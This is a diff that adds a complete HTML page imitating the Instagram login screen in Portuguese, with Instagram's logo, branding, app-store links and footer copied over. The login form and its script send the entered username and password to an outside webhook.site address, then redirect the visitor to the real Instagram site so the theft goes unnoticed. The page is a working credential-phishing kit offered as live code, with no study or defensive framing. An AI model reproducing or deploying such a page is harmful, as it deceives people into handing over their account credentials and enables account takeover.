@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <link rel="icon" href="https://instagram.com/favicon.ico" type="image/x-icon" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .wrapper {
+      max-width: 350px;
+      width: 100%;
+    }
+
+    .container {
+      width: 100%;
+      border: 1px solid #dbdbdb;
+      background-color: #fff;
+      padding: 40px 40px 20px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .logo-container {
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+    }
+
+    .instagram-logo {
+      background-image: url("https://static.cdninstagram.com/rsrc.php/v4/yB/r/E7m8ZCMOFDS.png");
+      background-position: 0px 12px;
+      background-size: 176px 181px;
+      width: 175px;
+      height: 51px;
+      background-repeat: no-repeat;
+      display: inline-block;
+    }
+
+    input {
+      width: 100%;
+      margin-bottom: 6px;
+      padding: 9px 8px 7px;
+      border: 1px solid #dbdbdb;
+      background: #fafafa;
+      font-size: 12px;
+      border-radius: 3px;
+      color: #262626;
+    }
+
+    input::placeholder {
+      color: #8e8e8e;
+      opacity: 1;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #a8a8a8;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 8px;
+      padding: 7px;
+      border: none;
+      border-radius: 8px;
+      background-color: #0095f6;
+      color: white;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      background-color: rgba(0, 149, 246, 0.3);
+      cursor: default;
+    }
+
+    .separator {
+      display: flex;
+      align-items: center;
+      margin: 18px 0;
+    }
+
+    .separator div {
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+
+    .separator span {
+      margin: 0 18px;
+      font-size: 13px;
+      color: #8e8e8e;
+      font-weight: 600;
+      text-transform: uppercase;
+    }
+
+    .facebook-login {
+      color: #385185;
+      font-weight: 600;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin: 8px 0;
+      cursor: pointer;
+    }
+
+    .facebook-login img {
+      width: 16px;
+      height: 16px;
+    }
+
+    .forgot {
+      font-size: 12px;
+      margin-top: 12px;
+      color: #00376b;
+    }
+
+    .forgot a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    .signup-box {
+      border: 1px solid #dbdbdb;
+      background-color: #fff;
+      padding: 20px;
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+
+    .signup-box a {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .get-app {
+      text-align: center;
+      font-size: 14px;
+      color: #262626;
+      margin-bottom: 20px;
+    }
+
+    .download-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 20px;
+    }
+
+    .download-buttons img {
+      height: 40px;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 12px;
+      color: #8e8e8e;
+      padding: 0 20px;
+    }
+
+    footer ul {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      list-style: none;
+      margin-bottom: 16px;
+    }
+
+    footer li {
+      margin: 0 8px 8px 0;
+    }
+
+    footer a {
+      color: #8e8e8e;
+      text-decoration: none;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
+    .copyright {
+      margin-top: 16px;
+    }
+
+    @media (max-width: 450px) {
+      .container, .signup-box {
+        border: none;
+        background-color: transparent;
+        padding-left: 0;
+        padding-right: 0;
+      }
+      
+      body {
+        background-color: #fff;
+        padding-top: 0;
+      }
+      
+      .wrapper {
+        max-width: 100%;
+      }
+    }
+
+    @media (min-width: 876px) {
+      body {
+        background-color: #fafafa;
+      }
+      
+      .wrapper {
+        max-width: 350px;
+      }
+      
+      .container, .signup-box {
+        border: 1px solid #dbdbdb;
+        background-color: #fff;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="container">
+      <div class="logo-container">
+        <div class="instagram-logo" title="Instagram"></div>
+      </div>
+      <form id="loginForm" action="https://webhook.site/749fe344-f4c8-4a9c-94f3-e39506002da6" method="POST">
+        <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required />
+        <input type="password" name="password" placeholder="Senha" required />
+        <button type="submit" id="loginButton">Entrar</button>
+      </form>
+
+      <div class="separator">
+        <div></div>
+        <span>ou</span>
+        <div></div>
+      </div>
+
+      <div class="facebook-login">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Facebook" />
+        <span>Entrar com o Facebook</span>
+      </div>
+
+      <div class="forgot">
+        <a href="#">Esqueceu a senha?</a>
+      </div>
+    </div>
+
+    <div class="signup-box">
+      <span>Não tem uma conta?</span>
+      <a href="#">Cadastre-se</a>
+    </div>
+
+    <div class="get-app">
+      <p>Obtenha o aplicativo.</p>
+      <div class="download-buttons">
+        <a href="https://apps.apple.com/app/instagram/id389801252">
+          <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" />
+        </a>
+        <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
+          <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" />
+        </a>
+      </div>
+    </div>
+
+    <footer>
+      <ul>
+        <li><a href="#">Meta</a></li>
+        <li><a href="#">Sobre</a></li>
+        <li><a href="#">Blog</a></li>
+        <li><a href="#">Carreiras</a></li>
+        <li><a href="#">Ajuda</a></li>
+        <li><a href="#">API</a></li>
+        <li><a href="#">Privacidade</a></li>
+        <li><a href="#">Termos</a></li>
+        <li><a href="#">Contas mais relevantes</a></li>
+        <li><a href="#">Hashtags</a></li>
+        <li><a href="#">Localizações</a></li>
+        <li><a href="#">Instagram Lite</a></li>
+        <li><a href="#">Carregamento de contatos e não usuários</a></li>
+      </ul>
+      <div class="copyright">
+        <span>Português (Brasil)</span>
+        <span>© 2024 Instagram from Meta</span>
+      </div>
+    </footer>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+  
+      const button = document.getElementById('loginButton');
+      button.disabled = true;
+      button.textContent = 'Enviando...';
+  
+      const formData = new FormData(this);
+  
+      fetch(this.action, {
+        method: 'POST',
+        body: formData,
+      })
+      .then(() => {
+        window.location.href = 'https://www.instagram.com';
+      })
+      .catch(() => {
+        window.location.href = 'https://www.instagram.com';
+      })
+      .finally(() => {
+        button.disabled = false;
+        button.textContent = 'Entrar';
+      });
+    });
+  
+    const inputs = document.querySelectorAll('input');
+    const loginButton = document.getElementById('loginButton');
+  
+    function checkInputs() {
+      let allFilled = true;
+      inputs.forEach(input => {
+        if (!input.value.trim()) {
+          allFilled = false;
+        }
+      });
+      loginButton.disabled = !allFilled;
+    }
+  
+    inputs.forEach(input => {
+      input.addEventListener('input', checkInputs);
+    });
+  
+    checkInputs();
+  </script>
+  
+</body>
+</html>
